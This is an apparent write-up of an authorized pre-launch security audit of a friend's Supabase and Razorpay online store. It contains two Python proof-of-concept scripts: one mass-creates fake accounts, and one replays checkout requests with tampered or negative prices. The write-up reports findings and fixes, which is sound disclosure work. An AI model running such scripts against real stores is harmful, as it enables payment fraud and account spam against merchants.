# Security Audit on Friend's DmToShop website

So i ran on a friend's ecommerce site which is hosted on DMtoShop and built on supabase with razorpay payment gateway before he launched publicly.

He asked me to test at it and tell him what i found. I found two real issues/vuln

---

## What I tested

1. Can someone create unlimited fake accounts?
2. Can someone buy a ₹865 product for ₹1?
3. Can someone guess other customers' order IDs?

---

## Step 1 — Recon

So i opened the site in Chrome → DevTools → Network tab
Filtered requests to the Supabase domain
Clicked around the site (signup, add to cart, checkout) and saved every interesting request.
I also used burpsuite to analyze all the responses

I was looking for:
* API endpoints that i could call directly from a script
* Request bodies that should contained prices, ids, or anything a client could lie about

The endpoints I found:
* `POST /functions/v1/customer-signup`
* `POST /functions/v1/create-razorpay-checkout`
* `POST /functions/v1/customer-forgot-password`

The signup request body looked like this:
```json
{
  "store_id": "<REDACTED>",
  "full_name": "test user",
  "email": "test@example.com",
  "phone": "919999999999",
  "password": "TestPass123!"
}
```

But the checkout body was more interesting.
It had both `total_amount` and `items[].price`
Two places to set a price
The server should pick one source of truth which is the database and ignore both client values

---

## Step 2 — Question the client values

For each field the client sends, I asked:

> should this even be trusted?

| Field           | Sent by client | Should server trust it?    |
| --------------- | -------------- | -------------------------- |
| total_amount    | yes            | NO — recompute from DB     |
| items[].price   | yes            | NO — read from DB          |
| store_id        | yes            | YES but validate it exists |
| customer_id     | yes            | YES but validate ownership |
| idempotency_key | yes            | YES for replay protection  |

If the server blindly copied `total_amount` into razorpay's amount field, anyone could pay ₹1 for anything

---

## Step 3 — PoC #1: Mass account creation

Small Python script that loops and creates users.

```python
import requests
import random
import string
import time

URL = "https://<PROJECT>.supabase.co/functions/v1/customer-signup"
KEY = "<PUBLISHABLE_KEY>"

def rand_email():
    n = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{n}@tempmail-test.com"

for i in range(20):
    r = requests.post(
        URL,
        headers={
            "Authorization": f"Bearer {KEY}",
            "apikey": KEY,
            "Content-Type": "application/json",
            "Origin": "https://<FRIEND_DOMAIN>"
        },
        json={
            "store_id": "<STORE_ID>",
            "full_name": "Test",
            "email": rand_email(),
            "phone": "910000000000",
            "password": "TestPass123!"
        }
    )

    print(f"[{i+1}] {r.status_code} {r.text[:80]}")
    time.sleep(0.3)
```

### Result
20/20 accounts created in 6 seconds

No:
* rate limiting
* CAPTCHA if so many requests from single ip and in seconds
* signup throttling

---

## Step 4 — PoC #2: Price manipulation

Same idea, but mutate the only price fields and replay the checkout request.

```python
import requests
import uuid

URL = "https://<PROJECT>.supabase.co/functions/v1/create-razorpay-checkout"
KEY = "<PUBLISHABLE_KEY>"

def attempt(total, item_price):
    return requests.post(
        URL,
        headers={
            "Authorization": f"Bearer {KEY}",
            "apikey": KEY,
            "Content-Type": "application/json",
            "Origin": "https://<FRIEND_DOMAIN>"
        },
        json={
            "customer_id": "<CUSTOMER_ID>",
            "store_id": "<STORE_ID>",
            "total_amount": total,
            "items": [{
                "product_id": "<PRODUCT_ID>",
                "product_name": "Test",
                "quantity": 1,
                "price": item_price,
                "variants": {}
            }],
            "idempotency_key": str(uuid.uuid4())
        }
    )

print(attempt(86500, 865).status_code)   # legit
print(attempt(1, 1).status_code)         # ₹1 attempt
print(attempt(0, 0).status_code)         # free attempt
print(attempt(-100, -100).status_code)   # negative attempt
```

### Result
The server returned a real Razorpay order ID using the manipulated amount.

---

## Findings I reported

### 01 — Signup spam

**Endpoint:** `customer-signup`

**Problem**
* no rate limit
* no CAPTCHA
* wildcard CORS

**Risk**
* fake accounts
* resource abuse
* forgot-password spam

**Fix**
* rate limiting
* Cloudflare Turnstile
* strict CORS policy
* generic duplicate responses

---

### 02 — Client-set pricing

**Endpoint:** `create-razorpay-checkout`

**Problem**

* server trusted `total_amount` from the request body

**Risk**

* manipulated payment values
* manipulated low-cost orders

**Fix**

* Should recompute prices server-side from the products table or from database

---

## What I took away

* Never trust client-controlled values
* CAPTCHA + rate limiting should exist on every public signup flow
* Prices should always be recomputed server-side
* Wildcard CORS is dangerous

---

## Files

* `signup_vuln.py` — POC for finding 1
* `price_vuln.py` — POC for finding 2

---

## Note

This was a friendly, authorized security review
The store owner explicitly asked me to test the application before launch
All real IDs, domains, and keys have been replaced
